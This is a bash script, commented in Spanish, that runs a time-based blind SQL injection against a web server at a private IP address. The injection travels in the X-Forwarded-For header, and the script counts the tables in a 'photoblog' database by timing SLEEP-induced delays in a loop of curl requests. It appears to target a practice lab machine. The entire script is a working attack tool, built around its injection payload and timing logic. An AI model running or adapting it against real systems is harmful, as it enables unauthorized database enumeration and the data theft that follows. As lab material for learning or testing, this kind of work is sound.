#!/bin/bash
#Idea: hacer que el servidor SQL duerma 1 seg. que en el caso de la inyección, equivale a sleep(0.043), sólo si el número de tablas en la base de datos equivale
#Payload: Para estta máquina se utiliza X-Forwarded-For para enviar la inyección y verificar si hay un retraso en la respuesta
# Procedimiento: 
# Verificación del Número de Tablas
#	Incrementa el table_count para verificar si existe una tabla adicional en photoblog.
#	El Payload cuenta el número de tablas; si hay más tablas que el valor actual de table_count, se ejecutará SLEEP(0.043), generando un retraso.
# Condición de finalización
#	Si el tiempo de respuesta no supera el retraso esperado, asume que ha alcanzado el número máximo de tablas y termina.
url="http://192.168.44.134"  
expected_delay=1.0           # Retraso esperado equivalente a 1 segundo real (sleep(0.043))
database_name="photoblog"    
table_count=0                

echo -e "\nIniciando búsqueda del número de tablas en la base de datos '$database_name'...\n"

# Bucle para iterar en el número de tablas, deteniéndose al no recibir retraso
while true; do
    # Construye el payload para verificar si la tabla en la posición actual existe
    payload="1' OR IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='$database_name' AND table_name IS NOT NULL) > $table_count, SLEEP(0.043), 0) #"

    # Envía la solicitud con el encabezado X-Forwarded-For para inyectar el payload
    start=$(date +%s.%N)
    response=$(curl -s -w "%{time_total}" -o /dev/null -H "X-Forwarded-For: $payload" "$url")
    end=$(date +%s.%N)

    # Calcula el tiempo de respuesta
    duration=$(echo "$end - $start" | bc)

    # Si el tiempo de respuesta es cercano al esperado, incrementamos el contador de tablas
    if (( $(echo "$duration > $expected_delay" | bc -l) )); then
        table_count=$((table_count + 1))
        echo "[+] Número de tablas detectadas hasta ahora: $table_count"
    else
        # Si no hay retraso, se ha alcanzado el número real de tablas
        echo -e "\n[!] Número total de tablas en la base de datos '$database_name': $table_count\n"
        break
    fi
done

